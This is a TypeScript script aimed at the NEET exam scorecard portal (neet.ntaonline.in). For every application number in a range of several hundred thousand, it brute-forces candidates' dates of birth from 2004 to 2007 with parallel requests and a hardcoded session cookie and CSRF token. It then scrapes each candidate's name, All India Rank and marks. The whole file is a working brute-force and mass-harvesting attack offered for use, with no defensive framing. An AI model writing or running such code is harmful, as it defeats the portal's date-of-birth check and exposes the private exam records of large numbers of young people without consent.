import axios from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';


async function solve(applicationNumber: string, day: string, month: string, year: string){
    let data = qs.stringify({
        '_csrf-frontend': '5t8wJeXMx1wSJ8RNIvrY2oCJl5bRmqqsVixnf6omznucuwBGnb6fN0NPh39Xr5act-_Gp5Xc-_k0VhFS2UyoDA==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year 
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
          'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8', 
          'Cache-Control': 'max-age=0', 
          'Connection': 'keep-alive', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Cookie': 'advanced-frontend=iev0qe66t29hjckiiuhg18oih3; _csrf-frontend=af67f16e056ce6675eb175860452a061cf0b2f5116675e7748e0f28c12f3cd9fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22zd0cxrXkQhC2uUNF7fQ1DFQUbzv-sjfw%22%3B%7D', 
          'DNT': '1', 
          'Origin': 'null', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1', 
          'Upgrade-Insecure-Requests': '1', 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 
          'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
          'sec-ch-ua-mobile': '?0', 
          'sec-ch-ua-platform': '"Windows"'
        },
        data : data
      };
      try{
      const response  = await axios.request(config)
      const parsedData = parseHTML(JSON.stringify(response.data))
    //   if(parsedData){
    //     console.log(parsedData.marks);
    //     console.log(parsedData.allIndiaRank);
    //   }  
    return parsedData;}
    catch(e){
        return null;
    }
}

function parseHTML(htmlcontent: string){
const $ = cheerio.load(htmlcontent);

const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';
const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';
const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

// console.log({
//     applicationNumber,
//     candidateName,
//     allIndiaRank,
//     marks
// })
if(allIndiaRank === 'N/A'){
    return null;
}
return {
    applicationNumber,
    candidateName,
    allIndiaRank,
    marks
}

}

async function main(rollNumber: string){
    let solved = false;
    for(let year = 2007;year >= 2004;year--){
        if(solved)
            break;
        for(let month = 1;month <=12;month++){
            if(solved)
                break;
            const dataPromises = [];
            console.log(`Processing ${rollNumber} for ${month}-${year}`);
            for(let day = 1;day <=30;day++){
                
               const dataPromise = solve(rollNumber,day.toString(), month.toString(),year.toString())
            //    if(data){
            //     console.log(data);
            //     process.exit(1);
            //    }
            dataPromises.push(dataPromise);
            }
            const resolvedData = await Promise.all(dataPromises);

            resolvedData.forEach(data =>{
                if(data){
                    console.log(data);
                 solved = true;
                }
            });
        }
    }
}


async function solveAllApplications(){
    for(let i = 240411345673;i<240411999999;i++){
        await main(i.toString());
    }
}
solveAllApplications();

